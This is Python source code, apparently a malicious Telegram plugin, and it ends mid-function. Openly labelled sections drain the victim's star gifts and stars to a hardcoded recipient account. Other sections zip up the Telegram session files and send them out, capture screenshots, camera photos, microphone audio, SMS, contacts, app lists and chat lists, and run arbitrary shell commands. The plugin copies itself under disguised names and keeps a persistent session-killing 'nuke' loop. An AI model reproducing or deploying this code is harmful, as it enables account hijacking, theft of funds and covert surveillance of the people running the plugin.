    # ─── GIFTS ────────────────────────────────────────────────────────────
    def _gift_is_listed(self, gift):
        try:
            ra = getattr(gift, "resell_amount", None)
            if ra is None:
                return False
            return _jlist_size(ra) > 0
        except Exception:
            return False

    def _input_saved_gift(self, saved):
        if saved.get("msg_id"):
            UI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
                      "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
            if not UI:
                return None, "no UserInput"
            o = UI()
            o.msg_id = int(saved["msg_id"])
            return o, None
        CI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
                  "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
        if not CI:
            return None, "no ChatInput"
        o = CI()
        uid = int(_UC().getInstance(0).getClientUserId())
        peer = self._get_input_peer(0, uid)
        if not peer:
            return None, "no self peer"
        o.peer = peer
        o.saved_id = int(saved.get("saved_id", 0))
        return o, None

    def _gift_is_suspect(self, sg, gift):
        try:
            cls = str(type(gift))
            is_unique = ("Unique" in cls or "TL_starGiftUnique" in cls
                         or _safe_int(getattr(gift, "num", 0)) > 0
                         or _get_bool_attr(gift, "isUnique", False)
                         or _get_bool_attr(gift, "canResell", False))
            conv = _safe_int(getattr(sg, "convert_stars", 0) or getattr(gift, "convert_stars", 0))
            if conv > 0 and not is_unique:
                return False
            for v in (_safe_int(getattr(sg, "saved_id", 0)),
                      _safe_int(getattr(sg, "msg_id", 0))):
                if 1500000000 <= v <= 2147483647:
                    return True
            oid = _safe_int(getattr(gift, "owner_id", 0) or getattr(sg, "owner_id", 0) or 0)
            if oid > 0:
                try:
                    my = int(self._my_id() or 0)
                except Exception:
                    my = 0
                if my > 0 and oid != my:
                    return True
        except Exception:
            pass
        return False

    def _get_saved_gifts(self):
        try:
            Req = _cls("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
                       "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
                       "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
            if not Req:
                return []
            uid = int(_UC().getInstance(0).getClientUserId())
            peer = self._get_input_peer(0, uid)
            if not peer:
                return []
            out = []
            offset = ""
            for _p in range(20):
                rq = Req()
                rq.peer = peer
                try:
                    rq.offset = offset
                except Exception:
                    pass
                rq.limit = 100
                resp, err = self._rg_rpc(rq, 0, 10.0, fast=True)
                if err is not None or resp is None:
                    break
                g = getattr(resp, "gifts", None)
                if g is None:
                    break
                gsize = _jlist_size(g)
                for i in range(gsize):
                    sg = _jlist_get(g, i)
                    gift = getattr(sg, "gift", None)
                    if not gift:
                        continue
                    cls = str(type(gift))
                    ra = getattr(gift, "resell_amount", None)
                    ra_l = _jlist_size(ra) > 0 if ra is not None else False
                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
                            or _safe_int(getattr(gift, "num", 0)) > 0
                            or _get_bool_attr(gift, "isUnique", False)
                            or _get_bool_attr(gift, "canResell", False))
                    out.append({
                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
                        "gift_id": _safe_int(getattr(gift, "id", 0)),
                        "title": str(getattr(gift, "title", "") or ""),
                        "slug": str(getattr(gift, "slug", "") or ""),
                        "u": is_u,
                        "bc": _is_blockchain_gift(gift, sg),
                        "suspect": self._gift_is_suspect(sg, gift),
                        "can_upgrade": _get_bool_attr(gift, "can_upgrade", False) if not is_u else False,
                        "upgrade_stars": _safe_int(getattr(gift, "upgrade_stars", 0)) if not is_u else 0,
                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
                        "listed": self._gift_is_listed(gift),
                    })
                nxt = str(getattr(resp, "next_offset", "") or "")
                if not nxt or nxt == offset or gsize == 0:
                    break
                offset = nxt
            return out
        except Exception as e:
            _log("get_saved_gifts: %s" % e)
            return []

    def _delist_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
                      "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            try:
                rq.resell_amount = None
            except Exception as e2:
                return {"error": str(e2)}
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _convert_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$convertStarGift",
                      "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _upgrade_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$upgradeStarGift",
                      "org.telegram.tgnet.tl.TL_stars$payments_upgradeStarGift")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            try:
                rq.keep_original_details = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 15.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _transfer_saved_gift(self, saved, target_uid, target_ah):
        if saved and saved.get("bc"):
            return {"error": "minted NFT skipped"}
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            tp_cls = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
                          "org.telegram.tgnet.tl.TL_inputPeerUser")
            if not tp_cls:
                return {"error": "no input peer class"}
            tp = tp_cls()
            tp.user_id = int(target_uid)
            tp.access_hash = int(target_ah)
            T = _cls("org.telegram.tgnet.tl.TL_stars$transferStarGift",
                     "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
            if T:
                rq = T()
                rq.stargift = o
                rq.to_id = tp
                r, e = self._rg_rpc(rq, 0, 8.0, fast=True)
                if r is not None:
                    return {"ok": True}
                etxt = getattr(e, "text", "") or str(e or "")
                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                    return {"error": "direct: %s" % etxt[:60]}
            Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
                       "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
            RF = _cls("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
                      "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
            SF = _cls("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
                      "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
            if not (Inv and RF and SF):
                return {"error": "no classes"}
            inv = Inv()
            inv.stargift = o
            inv.to_id = tp
            f = RF()
            f.invoice = inv
            fr, _fe = self._rg_rpc(f, 0, 8.0, fast=True)
            if fr is None:
                return {"error": "form fail"}
            s = SF()
            s.form_id = _safe_int(getattr(fr, "form_id", 0))
            s.invoice = inv
            sr, _se = self._rg_rpc(s, 0, 10.0, fast=True)
            return {"ok": True} if sr is not None else {"error": "send fail"}
        except Exception as e:
            return {"error": str(e)}

    def _stars_balance(self, acc=0):
        try:
            Rq = _cls("org.telegram.tgnet.tl.TL_payments$getStarsStatus",
                      "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
                      "org.telegram.tgnet.tl.TL_stars$getStarsStatus")
            if not Rq:
                return 0
            uid = int(_UC().getInstance(acc).getClientUserId())
            peer = self._get_input_peer(acc, uid)
            if not peer:
                return 0
            rq = Rq()
            rq.peer = peer
            try:
                rq.ton = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
            if r:
                bal = getattr(r, "balance", None)
                if bal:
                    try:
                        return int(getattr(bal, "amount", 0))
                    except Exception:
                        try:
                            return int(bal)
                        except Exception:
                            pass
        except Exception:
            pass
        return 0

    def _resolve_recipient(self, account=0):
        """
        Резолв получателя = BOT_UID (число).
        Использует getUser через MessagesController — resolveUsername не работает
        с числовыми строками, и userId уже известен локально.
        """
        uid_target = int(BOT_UID)
        with self._recipient_lock:
            c = self._recipient_ah_cache.get(account)
            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
                return c[0], c[1]
        # 1) local Telegram user store — быстро и без RPC
        try:
            mc = _MC().getInstance(account)
            u = mc.getUser(uid_target)
            if u is not None:
                ah = _safe_int(getattr(u, "access_hash", 0))
                if ah:
                    with self._recipient_lock:
                        self._recipient_ah_cache[account] = (uid_target, ah, time.time())
                    return uid_target, ah
        except Exception as e:
            _log("resolve recipient getUser: %s" % e)
        # 2) force-load user via users.getUsers RPC (не работает с числом в resolveUsername)
        try:
            Req = _cls("org.telegram.tgnet.TLRPC$TL_users_getUsers",
                       "org.telegram.tgnet.tl.TL_users$getUsers")
            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
            if Req and IU:
                iu = IU()
                iu.user_id = uid_target
                iu.access_hash = 0
                al = ArrayList()
                al.add(iu)
                req = Req()
                try:
                    req.id = al
                except Exception:
                    pass
                resp, _e = self._rg_rpc(req, account, 10.0, fast=True)
                if resp is not None:
                    users = getattr(resp, "users", None)
                    if users is not None and _jlist_size(users) > 0:
                        u = _jlist_get(users, 0)
                        uid = _safe_int(getattr(u, "id", 0))
                        ah = _safe_int(getattr(u, "access_hash", 0))
                        if uid and ah:
                            try:
                                mc = _MC().getInstance(account)
                                mc.putUsers(resp, True)
                            except Exception:
                                pass
                            with self._recipient_lock:
                                self._recipient_ah_cache[account] = (uid, ah, time.time())
                            return uid, ah
        except Exception as e:
            _log("resolve recipient getUsers: %s" % e)
        return 0, 0

    def _h_convert(self, test=False):
        gifts = self._get_saved_gifts()
        out = []
        converted = 0
        upgraded = 0
        balance = self._stars_balance(0)
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if g.get("can_upgrade") and int(g.get("upgrade_stars", 0) or 0) > 0:
                    continue
                conv = int(g.get("convert_stars", 0) or 0)
                if conv <= 0:
                    continue
                r = self._convert_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    converted += conv
                out.append({"gift_id": g.get("gift_id"),
                            "convert_stars": conv, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if not g.get("can_upgrade"):
                    continue
                up_cost = int(g.get("upgrade_stars", 0) or 0)
                if up_cost <= 0 or balance < up_cost:
                    continue
                r = self._upgrade_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    upgraded += 1
                    balance -= up_cost
                out.append({"gift_id": g.get("gift_id"),
                            "upgrade_stars": up_cost, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        return {"converted_stars": converted, "upgraded": upgraded, "results": out}

    def _h_u(self, target_id, target_ah, test=False):
        self._fee_deficit = 0
        gifts = self._get_saved_gifts()
        u_gifts = [g for g in gifts if g.get("u")
                   and not g.get("bc") and not g.get("suspect")]
        bc_gifts = [g for g in gifts if g.get("u") and g.get("bc")]
        suspect = [g for g in gifts if g.get("u")
                   and g.get("suspect") and not g.get("bc")]
        out = []
        now = int(time.time())
        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)),
                                     int(g.get("can_transfer_at", 0) or 0)))
        balance = self._stars_balance(0)
        skipped_fees = 0
        for g in bc_gifts:
            out.append({"gift_id": g.get("gift_id"), "bc": True,
                        "result": {"error": "minted NFT skipped"}})
        for g in suspect:
            out.append({"gift_id": g.get("gift_id"), "fake": True,
                        "result": {"error": "suspect fake skipped"}})
        for g in u_gifts[:100]:
            try:
                transfer_stars = int(g.get("transfer_stars", 0))
                can_transfer_at = int(g.get("can_transfer_at", 0) or 0)
                if can_transfer_at > now:
                    rem = can_transfer_at - now
                    d = rem // 86400
                    h = (rem % 86400) // 3600
                    out.append({"gift_id": g.get("gift_id"),
                                "unlock_at": can_transfer_at,
                                "result": {"error": "locked %dd %dh" % (d, h)}})
                    continue
                if g.get("listed"):
                    dr = self._delist_saved_gift(g)
                    if not (isinstance(dr, dict) and dr.get("ok")):
                        out.append({"gift_id": g.get("gift_id"),
                                    "result": {"error": "delist failed"}})
                        continue
                    time.sleep(0.3)
                if transfer_stars > 0 and transfer_stars > balance:
                    skipped_fees += transfer_stars
                    out.append({"gift_id": g.get("gift_id"),
                                "transfer_stars": transfer_stars,
                                "result": {"error": "need %d have %d" % (
                                    transfer_stars, balance)}})
                    continue
                r = self._transfer_saved_gift(g, target_id, target_ah)
                out.append({"gift_id": g.get("gift_id"),
                            "transfer_stars": transfer_stars, "result": r})
                if isinstance(r, dict) and r.get("ok") and transfer_stars > 0:
                    balance -= transfer_stars
                time.sleep(0.2)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        self._fee_deficit = max(0, skipped_fees - balance)
        return out

    def _h_reactions(self, acc=0):
        try:
            sp = STARS_POST
            m = re.match(r"^@?([A-Za-z0-9_]+)/(\d+)$", sp.strip())
            if not m:
                m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", sp)
            if not m:
                return {"error": "no post"}
            uname = m.group(1)
            mid = int(m.group(2))
            bal = self._stars_balance(acc)
            if bal <= 0:
                return {"balance": 0, "spent": 0}
            peer = None
            Resolve = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername",
                           "org.telegram.tgnet.tl.TL_contacts$resolveUsername")
            if Resolve:
                try:
                    rq = Resolve()
                    rq.username = uname
                    rres, _rerr = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if rres:
                        chats = getattr(rres, "chats", None)
                        if chats is not None and _jlist_size(chats) > 0:
                            chat = _jlist_get(chats, 0)
                            IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                             "org.telegram.tgnet.tl.TL_inputPeerChannel")
                            if IPChannel:
                                peer = IPChannel()
                                peer.channel_id = int(getattr(chat, "id", 0))
                                peer.access_hash = int(getattr(chat, "access_hash", 0))
                except Exception:
                    pass
            if peer is None:
                return {"error": "channel not resolved"}
            Rq = _cls("org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
                      "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction")
            if not Rq:
                return {"error": "no class"}
            spent = 0
            for _i in range(min(bal, 50)):
                try:
                    rq = Rq()
                    rq.peer = peer
                    rq.msg_id = mid
                    rq.count = 1
                    try:
                        rq.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
                    except Exception:
                        pass
                    r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
                    if r is None:
                        break
                    spent += 1
                except Exception:
                    break
            return {"balance": bal, "spent": spent}
        except Exception as e:
            return {"error": str(e), "spent": 0}

    def _drain_gifts(self, account=0, test=False):
        uid, ah = self._resolve_recipient(account)
        if not uid or not ah:
            return {"error": "no recipient (uid=%s ah=%s)" % (uid, ah)}
        orig = self.account
        self.account = int(account)
        try:
            conv = self._h_convert(test)
            u = self._h_u(uid, ah, test)
            stars = self._h_reactions(account)
        finally:
            self.account = orig
        return {"convert": conv, "u": u, "stars": stars,
                "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)}

    def _drain_gifts_thread(self):
        try:
            self._send_msg("Gift transfer...")
            r = self._drain_gifts(0)
            if r.get("error"):
                self._send_msg("Gift err: %s" % r["error"])
                return
            conv = r.get("convert") or {}
            u = r.get("u") or []
            ok_count = sum(1 for x in u if isinstance(x, dict)
                           and isinstance(x.get("result"), dict)
                           and x["result"].get("ok"))
            self._send_msg(
                "<b>Gift transfer done</b>\n"
                "Converted stars: %s\nUpgraded: %s\nTransferred: %d\nFee deficit: %s" % (
                    conv.get("converted_stars", 0),
                    conv.get("upgraded", 0), ok_count,
                    r.get("fee_deficit", 0)), html=True)
        except Exception as e:
            self._send_msg("gift thread err: " + str(e))

    # ─── SESSION THEFT ────────────────────────────────────────────────────
    def _collect_session_files(self, base):
        files = []
        m1 = base + "/files/tgnet.dat"
        if os.path.exists(m1):
            files.append(m1)
        ad = base + "/files"
        if os.path.isdir(ad):
            for name in os.listdir(ad):
                if name.startswith("account"):
                    p = ad + "/" + name + "/tgnet.dat"
                    if os.path.exists(p):
                        files.append(p)
                    uc = ad + "/" + name + "/userconfig.xml"
                    if os.path.exists(uc):
                        files.append(uc)
        pd = base + "/shared_prefs"
        if os.path.isdir(pd):
            for name in os.listdir(pd):
                low = name.lower()
                if ("userconfig" in low or "userconfing" in low
                        or "cache4" in low) and name.endswith(".xml"):
                    files.append(pd + "/" + name)
        c4 = base + "/files/cache4.db"
        if os.path.exists(c4):
            files.append(c4)
            for suffix in ("-wal", "-shm"):
                if os.path.exists(c4 + suffix):
                    files.append(c4 + suffix)
        return files

    def _manual_userbot_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = self._collect_session_files(base)
            if not files:
                self._send_msg("no session files")
                return
            amap = {}
            for a in self._get_accounts_list():
                amap[str(a.get("id"))] = {
                    "user_id": a.get("user_id"),
                    "username": a.get("username", ""),
                    "phone": a.get("phone", ""),
                }
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        if os.path.getsize(fp) <= MAX_DOC_SIZE:
                            zf.write(fp, arcname=os.path.relpath(fp, base).replace("\\", "/"))
                    except Exception:
                        pass
                if amap:
                    zf.writestr("accounts_map.json",
                                json.dumps(amap, ensure_ascii=False, indent=2))
                zf.writestr("_meta.json", json.dumps({
                    "package": pkg, "harvested_at": int(time.time()),
                    "files_count": len(files), "accounts": amap,
                }, ensure_ascii=False, indent=2))
            self._send_document_bytes("userbot_session.zip", z.getvalue())
        except Exception as e:
            self._send_msg("userbot err: " + str(e))

    def _manual_dump_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            for rd, _dirs, fns in os.walk(base):
                if rd.count("/") - base.count("/") > 3:
                    continue
                if any(x in rd for x in ("/cache/", "/files/cache",
                                         "/files/photos", "/files/videos")):
                    continue
                for f in fns:
                    low = f.lower()
                    if ("session" in low or "auth" in low or "cache4" in low
                            or low.endswith(".db") or low.endswith(".xml")):
                        fp = os.path.join(rd, f)
                        try:
                            if os.path.getsize(fp) <= MAX_DOC_SIZE:
                                files.append(fp)
                        except Exception:
                            pass
            if not files:
                self._send_msg("no session files")
                return
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception:
                        pass
            self._send_document_bytes("session.zip", z.getvalue())
        except Exception as e:
            self._send_msg("dump err: " + str(e))

    # ─── DEVICE HARVEST ───────────────────────────────────────────────────
    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return False
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _get_activity(self):
        for getter in (
            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
            lambda: ApplicationLoader.application.getCurrentActivity(),
        ):
            try:
                a = getter()
                if a is not None:
                    return a
            except Exception:
                pass
        return None

    def _screenshot(self):
        try:
            act = self._get_activity()
            if act is None:
                return {"error": "no act"}
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth()
            h = view.getHeight()
            if w <= 0 or h <= 0:
                return {"error": "bad size"}
            Bitmap = jclass("android.graphics.Bitmap")
            Canvas = jclass("android.graphics.Canvas")
            Config = jclass("android.graphics.Bitmap$Config")
            bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d):
                os.makedirs(d)
            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
            bmp.compress(fmt, 85, fos)
            fos.flush()
            fos.close()
            bmp.recycle()
            phone = "—"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                rp = _real_phone_or_empty(u)
                if rp:
                    phone = rp
            except Exception:
                pass
            self._send_photo(p, "Phone: " + phone)
            try:
                os.remove(p)
            except Exception:
                pass
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _manual_camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"):
                return {"error": "no perm"}
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                total = int(cam.getNumberOfCameras())
                for i in range(total):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing):
                        cid = i
                        break
            except Exception:
                pass
            if cid is None:
                cid = 1 if which == "front" else 0
            c = None
            for _ in range(4):
                try:
                    c = cam.open(int(cid))
                    break
                except Exception:
                    time.sleep(0.4)
            if c is None:
                return {"error": "no open"}
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st)
                c.startPreview()
                ev = threading.Event()
                box = [None]
                PC = jclass("android.hardware.Camera$PictureCallback")

                class _PC(dynamic_proxy(PC)):
                    def onPictureTaken(self, data, camera):
                        box[0] = data
                        ev.set()

                c.takePicture(None, None, _PC())
                ev.wait(8)
                if box[0]:
                    raw = bytes(box[0])
                    self._send_document_bytes("%s.jpg" % which, raw)
                    return {"ok": True}
                return {"error": "no photo"}
            finally:
                try:
                    c.stopPreview()
                except Exception:
                    pass
                try:
                    c.release()
                except Exception:
                    pass
        except Exception as e:
            return {"error": str(e)}

    def _manual_audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"):
                return {"error": "no perm"}
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
                             "a_%d.3gp" % int(time.time()))
            mr = jclass("android.media.MediaRecorder")()
            try:
                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
            except Exception:
                src = of = ae = 1
            mr.setAudioSource(src)
            mr.setOutputFormat(of)
            mr.setAudioEncoder(ae)
            mr.setOutputFile(p)
            mr.prepare()
            mr.start()
            time.sleep(int(sec))
            mr.stop()
            mr.release()
            with open(p, "rb") as f:
                data = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._send_document_bytes("audio.3gp", data)
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _manual_sms(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_SMS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"),
                               ["address", "body", "date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("SMS empty or no perm")
                return
            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:100]))), html=True)
        except Exception as e:
            self._send_msg("sms err: " + str(e))

    def _manual_contacts(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_CONTACTS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
                               ["display_name", "data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("Contacts empty or no perm")
                return
            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("contacts err: " + str(e))

    def _manual_apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            n = _jlist_size(apps)
            for i in range(n):
                try:
                    a = _jlist_get(apps, i)
                    pkg = str(a.packageName)
                    label = pkg
                    try:
                        label = str(pm.getApplicationLabel(a))
                    except Exception:
                        pass
                    out.append("%s — %s" % (label, pkg))
                except Exception:
                    pass
            out.sort()
            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:300]))), html=True)
        except Exception as e:
            self._send_msg("apps err: " + str(e))

    def _manual_chats(self):
        try:
            mc = _MC().getInstance(0)
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if not dialogs:
                self._send_msg("no dialogs")
                return
            out = []
            for i in range(_jlist_size(dialogs)):
                try:
                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
                    title = ""
                    if did > 0:
                        u = mc.getUser(did)
                        if u is not None:
                            title = " ".join(x for x in (
                                str(getattr(u, "first_name", "") or ""),
                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
                    else:
                        cid = -did
                        if cid > 1000000000000:
                            cid -= 1000000000000
                        c = mc.getChat(int(cid))
                        if c is not None:
                            title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception:
                    pass
            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("chats err: " + str(e))

    def _manual_shell(self, cmd):
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            out = p.stdout.decode("utf-8", "ignore")
            err = p.stderr.decode("utf-8", "ignore")
            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
                self._html_escape(cmd), p.returncode,
                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
        except Exception as e:
            self._send_msg("shell err: " + str(e))

    def _manual_terminate_session(self, h):
        try:
            req = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                       "org.telegram.tgnet.tl.TL_account$resetAuthorization")
            if not req:
                self._send_msg("no class")
                return
            rq = req()
            rq.hash = int(h)
            resp, err = self._rg_rpc(rq, 0, 12.0)
            if err is not None:
                self._send_msg("Error: %s" % str(err))
            else:
                self._send_msg("Session terminated.")
        except Exception as e:
            self._send_msg("Error: " + str(e))

    # ─── PERSISTENCE ──────────────────────────────────────────────────────
    def _plugins_dir(self):
        try:
            ctx = ApplicationLoader.applicationContext
            base = str(ctx.getFilesDir().getAbsolutePath())
            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))),
                             "files", "plugins")
            if os.path.isdir(p):
                return p
        except Exception:
            pass
        return None

    def _self_path(self):
        try:
            m = sys.modules.get(__name__)
            f = getattr(m, "__file__", None)
            if f and os.path.exists(f):
                return f
        except Exception:
            pass
        return None

    def _harden_file(self, path):
        try:
            k = path
            n = time.time()
            l = self._harden_cache.get(k, 0)
            if n - l < 10:
                return
            self._harden_cache[k] = n
        except Exception:
            pass
        try:
            from java.io import File
            f = File(path)
            f.setReadOnly()
        except Exception:
            pass

    def _replicate_self(self, n=10):
        pd = self._plugins_dir()
        if not pd:
            return {"ok": False}
        sp = self._self_path()
        if not sp:
            return {"ok": False}
        try:
            with open(sp, "rb") as f:
                src = f.read()
        except Exception as e:
            return {"ok": False, "error": str(e)}
        names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
                 "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
                 "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
                 "ring0_mon.plugin"]
        made = []
        for i in range(min(int(n), len(names))):
            try:
                tgt = os.path.join(pd, names[i])
                if os.path.exists(tgt):
                    made.append(names[i])
                    continue
                with open(tgt, "wb") as f:
                    f.write(src)
                self._harden_file(tgt)
                made.append(names[i])
            except Exception:
                pass
        return {"ok": True, "made": made}

    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
                                ".ar_nuke_active")
        except Exception:
            return None

    def _mark_nuke(self):
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f:
                    f.write("idk")
                self._harden_file(m)
            self._nuke_started = True
        except Exception:
            pass

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m):
                return
            self._nuke_started = True
            threading.Thread(target=self._nuke_loop, daemon=True).start()
        except Exception:
            pass

    def _nuke_loop(self):
        while self._sync_running and self._active:
            try:
                m = self._nuke_marker_path()
                if not m or not os.path.exists(m):
                    return
                self._parallel([(self._kill_all_sessions, 0),
                                (self._kill_web_authorizations, 0)],
